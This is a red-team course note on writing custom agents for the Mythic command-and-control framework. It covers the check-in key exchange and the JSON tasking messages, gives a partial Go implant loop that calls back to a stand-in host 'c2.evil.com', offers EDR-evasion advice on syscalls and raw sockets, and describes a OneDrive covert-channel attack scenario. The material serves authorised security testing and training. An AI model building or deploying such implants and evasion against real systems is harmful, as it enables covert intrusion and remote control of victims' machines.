---
tags: [mythic, c2, payloads, red-team, vapt]
difficulty: advanced
module: "97 - Mythic C2 Custom Agents and Payload Generation"
topic: "97.12 Developing Custom Mythic Agents from Scratch"
---

# 97.12 Developing Custom Mythic Agents from Scratch

## 1. Introduction to Mythic Agent Architecture

Mythic is unique among Command and Control (C2) frameworks due to its heavily decoupled, containerized architecture. Unlike monolithic C2s where the server and the agent are tightly integrated in a single codebase, Mythic uses a language-agnostic JSON-based messaging spec to communicate. This design allows operators to write agents in literally any language (C, C++, Rust, Go, Python, Swift, Nim) as long as the agent can conform to the REST or dynamic C2 profile specifications.

Developing a custom Mythic agent from scratch is a rite of passage for advanced red teams aiming to completely bypass signature-based detections associated with public agents like Apollo or Poseidon.

### 1.1 Core Requirements of a Mythic Agent
A fully functional Mythic agent requires the following components:
1. **Cryptography & Key Exchange:** Support for AES256-HMAC encryption and optionally EKE (Encrypted Key Exchange) for secure session establishment.
2. **C2 Profile Implementation:** A module to egress traffic (e.g., HTTP POST requests, DNS TXT queries, SMB named pipes).
3. **JSON Parser:** A reliable way to parse incoming tasks and serialize responses.
4. **Task Routing Engine:** A loop that checks in, retrieves tasks, routes them to specific command functions, and queues the output for exfiltration.

## 2. The Check-in Process and Cryptographic Negotiation

Before an agent can receive commands, it must authenticate and establish a session key with the Mythic server. Mythic handles this via an Initial Check-in message.

### 2.1 Standard Check-in vs EKE
- **Standard:** The agent uses a hardcoded pre-shared key (PSK) defined during payload generation to encrypt the initial JSON check-in. The server responds with a confirmation.
- **EKE (Encrypted Key Exchange):** The agent generates an RSA keypair, sends the public key encrypted with the PSK. The server generates a unique session AES key, encrypts it with the agent's public key, and sends it back. All subsequent communication uses this unique session key.

### 2.2 ASCII Diagram: Agent Check-in Sequence

```text
+------------------+                                      +------------------+
|                  |                                      |                  |
|  Custom Agent    |                                      |  Mythic Server   |
|                  |                                      |                  |
+------------------+                                      +------------------+
         |                                                         |
         | (1) Generate initial Check-in JSON                      |
         | { "action": "checkin", "uuid": "payload-uuid", ... }    |
         |                                                         |
         | (2) Encrypt JSON using AES256-HMAC (PSK)                |
         |                                                         |
         | (3) HTTP POST /api/v1.4/agent_message                   |
         |-------------------------------------------------------->|
         |                                                         |
         |                                    (4) Decrypt message  |
         |                                    (5) Register Agent   |
         |                                    (6) Generate New ID  |
         |                                                         |
         | (7) HTTP 200 OK + Encrypted Response JSON               |
         |<--------------------------------------------------------|
         | { "action": "checkin", "id": "new-agent-uuid", ...}     |
         |                                                         |
         | (8) Update internal UUID                                |
         | (9) Begin polling loop with new UUID                    |
         |-------------------------------------------------------->|
```

## 3. The Mythic JSON Message Specification

The heart of the agent is parsing and generating the correct JSON structures. A typical get-tasking request looks like this:

```json
{
    "action": "get_tasking",
    "tasking_size": -1,
    "delegates": [],
    "get_delegate_tasks": false
}
```

The server responds with an array of tasks:

```json
{
    "action": "get_tasking",
    "tasks": [
        {
            "command": "shell",
            "parameters": "whoami /all",
            "id": "e2c34-...",
            "timestamp": 1629384729
        }
    ],
    "delegates": []
}
```

The agent executes the task and posts a response:

```json
{
    "action": "post_response",
    "responses": [
        {
            "task_id": "e2c34-...",
            "user_output": "nt authority\\system...",
            "completed": true,
            "status": "success"
        }
    ]
}
```

## 4. Building the Core Loop in Go (Example)

Go is a popular choice for custom agents due to its cross-compilation capabilities and robust standard library.

```go
package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"time"
)

// Agent configuration
var (
	PayloadUUID = "REPLACE_WITH_UUID"
	AgentUUID   = ""
	CallbackURI = "http://c2.evil.com/data"
	AESKey      = []byte("REPLACE_WITH_BASE64_KEY_DECODED")
	SleepTime   = 5 * time.Second
)

// Simplified Check-in Structure
type CheckInMsg struct {
	Action         string `json:"action"`
	IP             string `json:"ip"`
	OS             string `json:"os"`
	User           string `json:"user"`
	Host           string `json:"host"`
	Pid            int    `json:"pid"`
	UUID           string `json:"uuid"`
	Architecture   string `json:"architecture"`
	IntegrityLevel int    `json:"integrity_level"`
}

func main() {
	// 1. Perform Checkin
	PerformCheckin()

	// 2. Enter Tasking Loop
	for {
		tasks := GetTasking()
		for _, task := range tasks {
			go RouteTask(task) // Execute asynchronously
		}
		time.Sleep(SleepTime)
	}
}

func PerformCheckin() {
	msg := CheckInMsg{
		Action:         "checkin",
		IP:             "192.168.1.10", // Usually dynamically resolved
		OS:             "Windows",
		User:           "Administrator",
		Host:           "WIN-DC01",
		Pid:            1337,
		UUID:           PayloadUUID,
		Architecture:   "x64",
		IntegrityLevel: 3, // High integrity
	}
	
	rawJson, _ := json.Marshal(msg)
	encrypted := EncryptMessage(rawJson) // Custom wrapper for AES256-HMAC
	
	resp := PostData(encrypted)
	
	// Parse response to get the new AgentUUID
	var checkinResp map[string]interface{}
	json.Unmarshal(DecryptMessage(resp), &checkinResp)
	AgentUUID = checkinResp["id"].(string)
}
```

## 5. Agent OPSEC and Implementation Complexities

### 5.1 Multi-threading and Job Tracking
A well-designed agent should never block on a long-running task (e.g., a port scan or large file download). Tasks must be dispatched to separate threads or goroutines. The agent must maintain a thread-safe global state map to track running jobs, allowing the server to issue `jobkill` commands to terminate specific routines.

### 5.2 Egress Implementation
Instead of relying strictly on standard `WinINet` or `WinHTTP` APIs in Windows (which are heavily hooked and monitored by EDRs), a custom agent can implement a raw socket HTTP client, or utilize RPC/SMB for peer-to-peer (P2P) communication deep within the network where internet access is unavailable. 

### 5.3 Memory Artifacts
Writing an agent in Go introduces massive memory footprints due to the Go runtime and garbage collector. Go binaries leave easily identifiable strings in memory. For maximum evasion, custom agents are often written in C or Nim, utilizing direct syscalls (SysWhispers) and carefully managing memory allocations (avoiding persistent `RWX` memory).

## 6. Real-World Attack Scenario

**The Environment:** A highly secure defense contractor utilizing a "default-deny" application whitelisting policy and an aggressive EDR configured to block standard C2 frameworks. 

**The Execution:**
1. The Red Team authors a custom Mythic agent in Rust, named `Wraith`.
2. `Wraith` does not use standard HTTP. Instead, it utilizes a custom Mythic C2 profile that communicates by reading and writing hidden attributes to files synced via an allowed corporate OneDrive application (a custom OneDrive C2 channel).
3. The Red Team deploys `Wraith` onto a target system via a DLL sideloading vulnerability in a trusted application.
4. `Wraith` initializes, reads its Payload UUID, and writes an encrypted check-in JSON payload into a temporary file synced by OneDrive.
5. A Mythic external C2 gateway monitors the attacker's OneDrive, retrieves the file, decrypts it, and posts it to the Mythic server via the internal API.
6. The Mythic server registers the new agent. The operator interacts natively within the Mythic UI, completely unaware of the complex OneDrive translation happening in the background. EDR sees only `onedrive.exe` performing standard file syncing operations.

## 7. Chaining Opportunities

- **[[11 - Integrating BOFs in Mythic]]**: Once the custom agent is established, integrate a BOF loader to extend its capabilities dynamically without needing to recompile or update the Rust/Go codebase.
- **[[14 - Evading Signatures with Unique Mythic Payloads]]**: Integrate the custom agent into Mythic's builder ecosystem using Docker, allowing operators to generate unique obfuscated versions of the agent on-the-fly from the UI.
- **[[13 - Mythic Event Feed and Team Collaboration]]**: Ensure the custom agent's check-in properly populated all metadata fields so the Event Feed correctly notifies the team of the new high-value compromise.

## 8. Related Notes
- [[11 - Integrating BOFs in Mythic]]
- [[13 - Mythic Event Feed and Team Collaboration]]
- [[14 - Evading Signatures with Unique Mythic Payloads]]
- [[15 - Mythic Scripting API Automating Operations]]
- [[33 - Custom C2 Channel Development]]
- [[66 - Defeating EDR with Direct Syscalls]]
